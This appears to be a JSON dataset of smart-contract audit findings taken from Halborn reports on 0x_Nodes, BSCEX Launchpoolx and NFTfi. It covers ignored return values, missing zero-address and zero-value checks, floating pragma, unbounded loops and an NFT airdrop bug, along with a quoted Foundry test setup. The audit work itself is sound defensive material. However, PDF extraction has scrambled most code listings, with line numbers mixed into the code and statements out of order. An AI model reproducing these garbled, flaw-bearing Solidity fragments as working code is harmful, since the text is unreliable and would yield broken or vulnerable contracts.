))) ( contracts / core / YieldManager . sol #295 -301) 63 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : wethReceived = weth 53 . balanceOf ( address ( this )) - wethBalanceBefore ( contracts / core / YieldManager . sol #303) 64 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : wethReceived = weth . balanceOf ( address ( this )) - getProcessedWethByTokenSum () ( contracts / core / YieldManager . sol #306 -308) 65 YieldManager . ethToRewards ( uint256 ) ( contracts / core / YieldManager . sol #416 -452) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / core / YieldManager . sol #430) 66 YieldManager . ethToRewards ( uint256 ) ( contracts / core / YieldManager . sol #416 -452) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )) . increaseEthRewards ( tokenAddress ,( ethRewardsAmount * processedWethByToken [ tokenAddress ]) / processedWethByTokenSum ) ( contracts / core / YieldManager . sol #433 -438) 67 YieldManager . getProcessedWethSum () ( contracts / core / YieldManager . sol #572 -588) has external calls inside a loop : tokenAddress = IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )). getTokenAddress ( tokenId ) ( contracts / core / YieldManager . sol #583 -585) 68 YieldManager . getProcessedWethByTokenSum () ( contracts / core / YieldManager . sol #602 -618) has external calls inside a loop : processedWethByTokenSum += processedWethByToken [ in", "labels": ["Halborn", "0x_Nodes", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the project there are many instances where external methods are being called and return values are being ignored. Code Location: Listing 25: Kernel.sol (Lines 475) function withdraw ( address [] memory tokens , uint256 [] memory amounts , bool withdrawWethAsEth ) external { uint256 ethWithdrawn = IUserPositions ( moduleMap . getModuleAddress ( Modules . UserPositions ) ). withdraw ( msg . sender , tokens , amounts , withdrawWethAsEth ); if ( ethWithdrawn > 0) { IWeth9 ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). withdraw ( ethWithdrawn ); payable ( msg . sender ). transfer ( ethWithdrawn ); } emit Withdraw ( msg . sender , tokens , amounts , ethWithdrawn ); } 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 71 Listing 26: Kernel.sol (Lines 510) 488 function withdrawAllAndClaim ( address [] memory tokens , bool withdrawWethAsEth ) external returns ( uint256 [] memory tokenAmounts , uint256 ethWithdrawn , uint256 ethClaimed , uint256 biosClaimed ) { ( tokenAmounts , ethWithdrawn , ethClaimed , biosClaimed ) = IUserPositions ( moduleMap . getModuleAddress ( Modules . UserPositions ) ). withdrawAllAndClaim ( msg . sender , tokens , withdrawWethAsEth ); if ( ethWithdrawn > 0) { IWeth9 ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). withdraw ( ethWithdrawn ); } if ( ethWithdrawn + ethClaimed > 0) { payable ( msg . sender ). transfer ( ethWithdrawn + ethClaimed ); } 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 Listing 27: Kernel.sol (Lines 532) function claimEthRewards () public returns ( uint256 ethClaimed ) { ethClaimed = IUserPositions ( moduleMap . getModuleAddress ( Modules . UserPositions ) ). claimEthRewards ( msg . sender ); payable ( msg . sender ). transfer ( ethClaimed ); emit ClaimEthRewards ( msg . sender , ethClaimed ); } 526 527 528 529 530 531 532 533 534 535 536 72 Listing 28: YieldManager.sol (Lines 351) 318 function distributeEth () external override onlyController { 319 IIntegrationMap integrationMap = IIntegrationMap ( 320 321 322 ); address wethAddress = IIntegrationMap ( integrationMap ). moduleMap . getModuleAddress ( Modules . IntegrationMap ) 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 getWethTokenAddress () ; // First fill up gas wallet with ETH ethToGasAccount () ; uint256 wethToDistribute = IERC20MetadataUpgradeable ( wethAddress ). balanceOf ( address ( this ) ); if ( wethToDistribute > 0) { uint256 biosBuyBackWethAmount = ( wethToDistribute * biosBuyBackEthWeight ) / getEthWeightSum () ; uint256 treasuryWethAmount = ( wethToDistribute * treasuryEthWeight ) / getEthWeightSum () ; uint256 protocolFeeWethAmount = ( wethToDistribute * protocolFeeEthWeight ) / getEthWeightSum () ; uint256 rewardsWethAmount = wethToDistribute - biosBuyBackWethAmount - treasuryWethAmount - protocolFeeWethAmount ; // Send WETH to SushiSwap trader for BIOS buy back IERC20MetadataUpgradeable ( wethAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . SushiSwapTrader ) , biosBuyBackWethAmount ); // Swap WETH for ETH and transfer to the treasury account IWeth9 ( wethAddress ). withdraw ( treasuryWethAmount ); payable ( treasuryAccount ). transfer ( treasuryWethAmount ); // Send ETH to protocol fee accrual rewards ( BIOS stakers ) ethToProtocolFeeAccrual ( protocolFeeWethAmount ); // Send ETH to token rewards ethToRewards ( rewardsWethAmount ); 73 } } 358 359 360 74 Listing 29: YieldManager.sol (Lines 382,390) address wethAddress = IIntegrationMap ( 362 function ethToGasAccount () private { 363 364 365 366 ). getWethTokenAddress () ; uint256 wethBalance = IERC20MetadataUpgradeable ( wethAddress ). moduleMap . getModuleAddress ( Modules . IntegrationMap ) balanceOf ( address ( this ) ); if ( wethBalance > 0) { uint256 gasAccountActualEthBalance = gasAccount . balance ; if ( gasAccountActualEthBalance < gasAccountTargetEthBalance ) { // Need to send ETH to gas account uint256 ethAmountToGasAccount ; if ( wethBalance < gasAccountTargetEthBalance - gasAccountActualEthBalance ) { // Send all of WETH to gas wallet ethAmountToGasAccount = wethBalance ; IWeth9 ( wethAddress ). withdraw ( ethAmountToGasAccount ); gasAccount . transfer ( ethAmountToGasAccount ); } else { // Send portion of WETH to gas wallet ethAmountToGasAccount = gasAccountTargetEthBalance - gasAccountActualEthBalance ; IWeth9 ( wethAddress ). withdraw ( ethAmountToGasAccount ); gasAccount . transfer ( ethAmountToGasAccount ); } } } } 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 75 Listing 30: YieldManager.sol (Lines 449) 416 function ethToRewards ( uint256 ethRewardsAmount ) private { 417 418 419 420 uint256 processedWethByTokenSum = getProcessedWethSum () ; require ( processedWethByTokenSum > 0, \" YieldManager :: ethToRewards : No processed WETH to distribute \" ); IIntegrationMap integrationMap = IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap ) ); address wethAddress = integrationMap . getWethTokenAddress () ; uint256 tokenCount = integrationMap . getTokenAddressesLength () ; for ( uint256 tokenId ; tokenId < tokenCount ; tokenId ++) { address tokenAddress = integrationMap . getTokenAddress ( tokenId ); if ( processedWethByToken [ tokenAddress ] > 0) { IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )) . increaseEthRewards ( tokenAddress , ( ethRewardsAmount * processedWethByToken [ tokenAddress ]) / processedWethByTokenSum ); processedWethByToken [ tokenAddress ] = 0; } } lastEthRewardsAmount = ethRewardsAmount ; IWeth9 ( wethAddress ). withdraw ( ethRewardsAmount ); payable ( moduleMap . getModuleAddress ( Modules . Kernel )) . transfer ( ethRewardsAmount ); 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 76 Listing 31: YieldManager.sol (Lines 477,482) 456 function ethToProtocolFeeAccrual ( uint256 protocolFeeEthRewardsAmount ) private { IIntegrationMap integrationMap = IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap ) ); address biosAddress = integrationMap . getBiosTokenAddress () ; address wethAddress = integrationMap . getWethTokenAddress () ; if ( IStrategyMap ( moduleMap . getModuleAddress ( Modules . StrategyMap ) ) . getTokenTotalBalance ( biosAddress ) > 0 ) { // BIOS has been deposited , increase Ether rewards for BIOS depositors IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )) . increaseEthRewards ( biosAddress , protocolFeeEthRewardsAmount ); IWeth9 ( wethAddress ). withdraw ( protocolFeeEthRewardsAmount ); payable ( moduleMap . getModuleAddress ( Modules . Kernel )) . transfer ( protocolFeeEthRewardsAmount ); } else { // No BIOS has been deposited , send WETH back to Kernel as reserves IERC20MetadataUpgradeable ( wethAddress ). transfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , protocolFeeEthRewardsAmount ); } } 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 77 Listing 32: YearnIntegration.sol (Lines 122) for ( uint256 tokenId = 0; tokenId < tokenCount ; tokenId ++) { IERC20MetadataUpgradeable token = IERC20MetadataUpgradeable ( ); uint256 tokenCount = integrationMap . getTokenAddressesLength () ; moduleMap . getModuleAddress ( Modules . IntegrationMap ) IIntegrationMap integrationMap = IIntegrationMap ( integrationMap . getTokenAddress ( tokenId ) 101 function deploy () external override onlyController { 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 // Check if a vault for this token exists if ( vaultAddress != address (0) ) { if ( tokenAmount > 0) { try } ); uint256 tokenAmount = token . balanceOf ( address ( this )) ; address vaultAddress = getVaultAddress ( address ( token )) ; if ( token . allowance ( address ( this ) , vaultAddress ) == 0) { token . safeApprove ( vaultAddress , type ( uint256 ). max ); IYearnVault ( vaultAddress ). deposit ( tokenAmount , address ( this )) {} catch {} 123 124 125 126 127 128 } } } } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 78 Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 79 ", "labels": ["Halborn", "0x_Nodes", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Lack of zero address validation has been found at many instances in YieldManager.sol, UniswapIntegration.sol, when assigning user supplied address values to state variables directly. Code Location: Listing 33: IntegrationMap.sol (Lines 64) address tokenAddress , bool acceptingDeposits , bool acceptingWithdrawals , uint256 biosRewardWeight , uint256 reserveRatioNumerator 63 function _addToken ( 64 65 66 67 68 69 70 71 72 73 74 75 76 ) internal { require ( ); require ( ! tokens [ tokenAddress ]. added , \" IntegrationMap :: addToken : Token already added \" reserveRatioNumerator <= RESERVE_RATIO_DENOMINATOR , \" IntegrationMap :: addToken : reserveRatioNumerator must be less than or equal to reserve ratio denominator \" 77 78 79 80 81 82 83 84 85 86 87 ); tokens [ tokenAddress ]. id = tokenAddresses . length ; tokens [ tokenAddress ]. added = true ; tokens [ tokenAddress ]. acceptingDeposits = acceptingDeposits ; tokens [ tokenAddress ]. acceptingWithdrawals = acceptingWithdrawals ; tokens [ tokenAddress ]. biosRewardWeight = biosRewardWeight ; tokens [ tokenAddress ]. reserveRatioNumerator = reserveRatioNumerator ; tokenAddresses . push ( tokenAddress ); 80 88 } Listing 34: Kernel.sol (Lines 169) 169 function addIntegration ( address contractAddress , string memory name ) external onlyRole ( MANAGER_ROLE ) IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . addIntegration ( contractAddress , name ); emit IntegrationAdded ( contractAddress , name ); 170 171 172 173 174 175 176 177 178 { } Listing 35: YieldManager.sol (Lines 109) { external override onlyController 101 function updateGasAccount ( address payable gasAccount_ ) 102 103 104 105 106 107 108 109 110 gasAccount = gasAccount_ ; } Listing 36: YieldManager.sol (Lines 120) external override onlyController 113 function updateTreasuryAccount ( address payable treasuryAccount_ ) 114 115 116 117 118 119 120 121 treasuryAccount = treasuryAccount_ ; { } 81 Listing 37: DynamicRangeOrdersIntegration.sol (Lines 74) address dynamicRangeOrdersIntegrationDeployerAddress 73 function setDynamicRangeOrdersIntegrationDeployer ( 74 75 76 77 dynamicRangeOrdersIntegrationDeployer = ) external override onlyOwner { IDynamicRangeOrdersIntegrationDeployer ( dynamicRangeOrdersIntegrationDeployerAddress 78 79 80 ); } Listing 38: DynamicRangeOrdersIntegration.sol (Lines 83) external override onlyManager 83 function setBaseStablecoin ( address baseStablecoinAddress_ ) 84 85 86 87 88 89 90 IIntegrationMap ( moduleMap . getModuleAddress ( Modules . require ( { IntegrationMap )) . getIsTokenAdded ( baseStablecoinAddress_ ) , \" DROIntegration :: setBaseStablecoin : Token has not been added to IntegrationMap \" ); require ( baseStablecoinAddress_ != baseStablecoinAddress , \" DROIntegration :: setBaseStablecoin : Address is already the base stablecoin \" ); baseStablecoinAddress = baseStablecoinAddress_ ; 91 92 93 94 95 96 97 98 99 }  DynamicRangeOrdersIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress  AaveIntegration.sol  deposit -> tokenAddress 82  withdraw -> tokenAddress  SushiSwapIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress  UniswapIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress  YearnIntegration.sol  deposit -> tokenAddress  withdraw -> tokenAddress Recommendation: Add proper address validation when every state variable assignment done from user supplied input. Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 83 ", "labels": ["Halborn", "0x_Nodes", "Severity: Low"]}, {"title": "MISSING ZERO VALUE CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are functions within the project that should have a zero value check. Code Location: Listing 39: YieldManager.sol (Lines 81) 75 function updateGasAccountTargetEthBalance ( uint256 gasAccountTargetEthBalance_ ) external override onlyController gasAccountTargetEthBalance = gasAccountTargetEthBalance_ ; 76 77 78 79 80 81 82 { } Listing 40: YieldManager.sol (Lines 212) uint256 amount , uint256 numerator , uint256 denominator 206 function _calculateReserveAmount ( 207 208 209 210 211 212 213 } ) internal pure returns ( uint256 ) { return ( amount * numerator ) / denominator ;  Also possible division by 0. 84 Listing 41: UniswapTrader.sol (Lines 213) address tokenA , address tokenB , uint256 poolIndex , uint24 slippageNumerator 209 function updatePoolSlippageNumerator ( 210 211 212 213 214 215 216 217 218 219 ) external override onlyManager { require ( slippageNumerator <= SLIPPAGE_DENOMINATOR , \" UniswapTrader : updatePoolSlippageNumerator : Slippage numerator must not be greater than slippage denominator \" ); ( address token0 , address token1 ) = getTokensSorted ( tokenA , tokenB ); require ( pools [ token0 ][ token1 ][ poolIndex ]. slippageNumerator != slippageNumerator , \" UniswapTrader : updatePoolSlippageNumerator : Slippage numerator must be updated to a new number \" ); require ( pools [ token0 ][ token1 ]. length > poolIndex , \" UniswapTrader : updatePoolSlippageNumerator : Pool does not exist \" ); pools [ token0 ][ token1 ][ poolIndex ]. slippageNumerator = slippageNumerator ; emit UniswapPoolSlippageNumeratorUpdated ( token0 , token1 , poolIndex , slippageNumerator ); } 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 85 Listing 42: IntegrationMap.sol (Lines 68) address tokenAddress , bool acceptingDeposits , bool acceptingWithdrawals , uint256 biosRewardWeight , uint256 reserveRatioNumerator 63 function _addToken ( 64 65 66 67 68 69 70 71 72 73 74 75 76 ) internal { require ( ); require ( ! tokens [ tokenAddress ]. added , \" IntegrationMap :: addToken : Token already added \" reserveRatioNumerator <= RESERVE_RATIO_DENOMINATOR , \" IntegrationMap :: addToken : reserveRatioNumerator must be less than or equal to reserve ratio denominator \" 77 78 79 80 81 82 83 84 85 86 87 88 ); tokens [ tokenAddress ]. id = tokenAddresses . length ; tokens [ tokenAddress ]. added = true ; tokens [ tokenAddress ]. acceptingDeposits = acceptingDeposits ; tokens [ tokenAddress ]. acceptingWithdrawals = acceptingWithdrawals ; tokens [ tokenAddress ]. biosRewardWeight = biosRewardWeight ; tokens [ tokenAddress ]. reserveRatioNumerator = reserveRatioNumerator ; tokenAddresses . push ( tokenAddress ); } Listing 43: UniswapIntegration.sol (Lines 206) { external override onlyController 198 function deposit ( address tokenAddress , uint256 amount ) 199 200 201 202 203 204 205 206 207 balances [ tokenAddress ] += amount ; } 86 Listing 44: DynamicRangeOrdersIntegration.sol (Lines 168) uint256 amount , uint256 numerator , uint256 denominator 158 function _calculateReserveAmount ( 159 160 161 162 163 164 165 } ) internal pure returns ( uint256 ) { return ( amount * numerator ) / denominator ; Listing 45: Kernel.sol (Lines 382) address tokenAddress , uint256 reserveRatioNumerator , bool rebalance 380 function updateTokenReserveRatioNumerator ( 381 382 383 384 385 386 387 ) external onlyRole ( MANAGER_ROLE ) { IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . updateTokenReserveRatioNumerator ( tokenAddress , reserveRatioNumerator ); if ( rebalance ) { IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager )) . rebalance () ; } emit TokenReserveRatioNumeratorUpdated ( tokenAddress , reserveRatioNumerator , rebalance ); } 388 389 390 391 392 393 394 395 396 397 398 399 400  DynamicRangeOrdersIntegration.sol  deposit -> amount  withdraw -> amount 87  AaveIntegration.sol  deposit -> amount  withdraw -> amount  SushiSwapIntegration.sol  deposit -> amount  withdraw -> amount  UniswapIntegration.sol  deposit -> amount  withdraw -> amount  YearnIntegration.sol  deposit -> amount  withdraw -> amount Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to add a zero value check to ensure that those variables were not set to 0. Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 88 3.10 (HAL-10) REDUNDANT CODE - LOW ", "labels": ["Halborn", "0x_Nodes", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf", "body": "All Smart Contracts use the floating pragma 0.6.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an updated compiler version that might introduce bugs or discovered vulnerabilities in the newest versions that affect the contract system negatively. Code Location: BSCXNTS.sol: [Line #2] Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider lock the pragma version known bugs for the compiler version. When possible, do not use floating pragma in the final live deployment. Pragma can also be locked fixing the compiler version in the configuration file when you deploy contracts with truffle or hardhat frameworks. 12 ", "labels": ["Halborn", "BSCEX_Launchpoolx_SmartContract", "Severity: Low"]}, {"title": "PRAGMA VERSION DEPRECATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf", "body": "The current version in use for the contracts is pragma 0.6.0. While this version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: BSCXNTS.sol: [Line #2] Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.2. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code. (0.6.12) 13 ", "labels": ["Halborn", "BSCEX_Launchpoolx_SmartContract", "Severity: Low"]}, {"title": "FOR LOOP OVER DYNAMIC ARRAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Code Location: BSCXNTS.sol: [Line #252] Dynamic array _halvingAtBlock is in control of caller and not bounded by any value. So in this case, dynamic array length can e anything. This array can go up to very large uint256 value, which is very large to exhaust the gas value. 14 Risk Level: Likelihood - 2 Impact - 3 Recommendations: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. In this case, if you want loop over _halvingAtBlock then the size of _halvingAtBlock should be restricted. ", "labels": ["Halborn", "BSCEX_Launchpoolx_SmartContract", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contract BSCXNTS.sol, there are few instances where external methods are being called and return value(bool) are being ignored. Code Location: BSCXNTS.sol: Line #381, Line #514 Line #224, Line #230, Line #233, Line #352, Line #366, 15 Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. ", "labels": ["Halborn", "BSCEX_Launchpoolx_SmartContract", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf", "body": "owner(), renounceOwnership(), transferOwnership(), In smart contracts Ownable.sol and BSCXNTS.sol, there are many methods like deposit(), totalLockInPool(), setPercentLPLevelRefer(), setAmountLPStakeLevelRefer setTeamAddressPool(), (), withdraw(), dev(), add(), lockOf() getNewRewardPerBlock(), and totalLock() are marked as public but they are never directly called by another function in the same contract or in any of its descendants, setReferralLPToken(), lastUnlockBlock(), set(), emergencyWithdraw(), unlock(), claimReward(), setStatus(), 16 so better to mark these methods as external. functions are cheaper than public functions in gas costs. In addition, external Code Location: Ownable.sol: Line #22, Line #41, Line #50 Line #105, Line #156, Line #161, Line #167, Line #173, BSCXNTS.sol: Line #179, Line #186, Line #307, Line #387, Line #410, Line #429, Line #439, Line #444, Line #455, Line #459, Line #463, Line #467, Line #504 17 Risk Level: Likelihood - 1 Impact - 1 Recommendations: If the function is not intended to call internally nor by their descendants as well then it is better to mark all these functions as external instead of public to save some gas. 3.6 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "BSCEX_Launchpoolx_SmartContract", "Severity: Informational"]}, {"title": "AIRDROP RECEIVER FUNCTIONALITY DENIED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Native_Punk_Wrapper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "function in the contract of the offer used. The borrower can never recover the collateral from the Escrow if the collateral is wrap to use the airdrop functionality. The AirdropReceiver functionality in the PunkWrapper contract is unusable, as it reverts to the transferNFT() function when it is called by the _resolveLoan() The issue is that the airdropReceiver instance has to be sent to the borrower so then, be- ing the owner, can drain all the airdrops inside the contract. How- ever, punkWrapper is only prepared to transfer Punks, and then the AirdropReceiver that has to be sent to the borrower to claim the airdrop, reverts in the transaction because it is not prepared to transfer ERC721 Airdrop Functionality for the Punks is disabled and the borrower can never recover the collateral. The Proof of Concept is the test number 9 AirdropReceiver. Code Location: Listing 1: PunkWrapper.sol (Lines 30-35) ) external override returns ( bool ) { if ( address ( this ) == _sender ) { function transferNFT ( address _sender , address _recipient , address _nftContract , uint256 _nftId 24 25 26 27 28 29 30 31 32 33  PunkWrapper : sender must be owner \"); 34 35 36 37 } return true ; } else { } IPunks ( _nftContract ). transferPunk ( _recipient , _nftId ); require ( isOwner ( _sender , _nftContract , _nftId ) , \" IPunks ( _nftContract ). buyPunk ( _nftId ); 13 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The remediation is adding the functionality for the PunkWrapper to send not only Native Punks, but also ERC721 NFTs. Remediation Plan: SOLVED: The NFTfi team fixed the issue in commit 529a1d25 by adding a try-catch to the transferNFT function. Listing 2: PunkWrapper.sol (Lines 35-38) function transferNFT ( address _sender , address _recipient , address _nftContract , uint256 _nftId 26 27 28 29 30 31 32 33 34  loans contract re - deploy 35  interfaceId ) { 36  , _nftId ); 37 38 39 40  _nftId ); 41 42  PunkWrapper : sender must be owner \"); 43 44 45 } return true ; return true ; } catch { } else { ) external override returns ( bool ) { // we have to check if we are wrapped - // ideally should be fixed in loan airdrop utils : // should update collateralWrapper , but that would need a try IERC721 ( _nftContract ). supportsInterface ( type ( IERC721 ). IERC721 ( _nftContract ). transferFrom ( _sender , _recipient if ( address ( this ) == _sender ) { IPunks ( _nftContract ). transferPunk ( _recipient , require ( isOwner ( _sender , _nftContract , _nftId ) , \" IPunks ( _nftContract ). buyPunk ( _nftId ); 14 46 47 } } 15 MANUAL TESTING 16 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 4.1 SCENARIOS TESTED  Test 1: General repayment cycle (Borrower - Escrow - Borrower)  Test 1.1: Attack vector: External user repays loan to steal the NFT (revert expected)  Test 2: General repayment cycle out of time (revert expected)  Test 3: General liquidation cycle (Borrower - Escrow - Lender)  Test 4: General liquidation cycle before agreement (revert expected)  Test 5: General repayment cycle out of time with renegotiation  Test 6: Attack vector: Borrower renegotiate their loan to steal the Punk (revert expected)  Test 7: General repayment cycle with promissory note transfer  Test 8: General repayment cycle with obligation receipt transfer  Test 8.2: Attack vector: Obligation receipt transfer and old owner of OR repay loan.  Test 9: General airdrop functionality (Airdrop receiver - Wrap - Unwrap) Script The following test environment was set up for the purposes of executing the above scenarios: Listing 3: PunkTest.t.sol // SPDX - License - Identifier : UNLICENSED 1 2 pragma solidity 0.8.4; 3 4 import \" forge - std / Test . sol \"; 5 import \" ../ src / NftfiHub . sol \" ; 6 import \" ../ src / loans / direct / loanTypes / DirectLoanFixedOfferRedeploy  . sol \"; 7 import \" @openzeppelin / contracts / utils / cryptography / ECDSA . sol \"; 8 import \" ../ src / mocks / NFT . sol \" ; 17 G N I T S E T L A U N A M using ECDSA for bytes32 ; NFTWrapper internal nftWrapper ; PunkWrapper internal punkWrapper ; NFT internal nftContract ; DummyPunks internal punkContract ; SimpleToken internal token ; SmartNft internal nftPromissoryNote ; SmartNft internal nftObligationReceipt ; NftfiHub internal nftFiHub ; DirectLoanCoordinator internal directLoanCoordinator ; DirectLoanFixedOfferRedeploy internal 9 import \" ../ src / mocks / NFTWrapper . sol \"; 10 import \" ../ src / test / DummyPunks . sol \" ; 11 import \" ../ src / nftTypeRegistry / nftTypes / PunkWrapper . sol \" ; 12 import \" ../ src / loans / direct / DirectLoanCoordinator . sol \" ; 13 import \" ../ src / mocks / SimpleERC20 . sol \" ; 14 import \" ../ src / permittedLists / PermittedAirdrops . sol \"; 15 import \" ../ src / permittedLists / PermittedNFTsAndTypeRegistry . sol \" ; 16 import \" ../ src / loans / direct / loanTypes / LoanData . sol \" ; 17 import \" ../ src / airdrop / AirdropReceiverFactory . sol \"; 18 19 contract punkTest is Test { 20 21 22 23 24 25 26 27 28 29 30 31  directLoanFixedOfferRedeploy ; 32  permittedNFTsAndTypeRegistry ; 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 address internal owner ; address internal admin ; address internal alice ; address internal bobby ; address internal carla ; address internal edgar ; address internal zeroo ; uint256 internal verifyingSignerPrivateKey ; address internal verifyingSigner ; address internal sender ; bytes4 [] internal selectors ; address [] internal airdopContracts ; address [] internal permittedErc20s ; PermittedAirdrops internal permittedAirdrop ; AirdropReceiver internal airdropReceiverToClone ; AirdropReceiver internal airdropReceiver ; AirdropReceiverFactory internal airdropReceiverFactory ; PermittedNFTsAndTypeRegistry internal 18 G N I T S E T L A U N A M 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 string [] internal contractKeys ; address [] internal contractAddresses ; string [] internal definedNftTypes ; address [] internal definedNftWrappers ; address [] internal permittedNftContracts ; string [] internal permittedNftTypes ; string [] internal loanTypes ; address [] internal loanContracts ; bool internal liquidated ; uint256 internal timeNow ; function setUp () public { /* *************** */ /* ADDRESSES SETUP */ /* *************** */ // ADDRESSES DECLARATION admin = vm . addr (0 x60DDD ); alice = vm . addr (0 xA71CE ); bobby = vm . addr (0 xB0BB1 ); carla = vm . addr (0 xCA47A ); edgar = vm . addr (0 xED6A4 ); zeroo = address (0) ; // 100 ETHER PER ADDRESS vm . deal ( admin , 100 ether ); vm . deal ( alice , 100 ether ); vm . deal ( bobby , 100 ether ); vm . deal ( carla , 100 ether ); vm . deal ( edgar , 100 ether ); // LABELING ADDRESSES vm . label ( admin , \" admin \" ); vm . label ( alice , \" alice \" ); vm . label ( bobby , \" bobby \" ); vm . label ( carla , \" carla \" ); vm . label ( edgar , \" edgar \" ); /* ***************** */ /* ENVIRONMENT SETUP */ /* ***************** */ // DEPLYING NFTWRAPPER vm . prank ( admin ); G N I T S E T L A U N A M 19 95 96 97 98 99 100 101 punkWrapper = new PunkWrapper () ; vm . prank ( admin ); nftWrapper = new NFTWrapper () ; // DEPLOYING NFT CONTRACT nftContract = new NFT ( address ( nftWrapper )) ; punkContract = new DummyPunks { value : 30000000 gwei }(  address ( punkWrapper )) ; 102 103 104 105 106 107 108 109 110 111 // MINT A PUNK TO ALICE vm . prank ( alice ); punkContract . mintPunk ( alice , 0) ; vm . prank ( carla ); nftContract . mintNFT (10) ; // DEPLOYING AND MINTING TOKEN vm . startPrank ( admin ); token = new SimpleToken ( \" token \" , \" TKN \" , 1000000  _000000000000000000 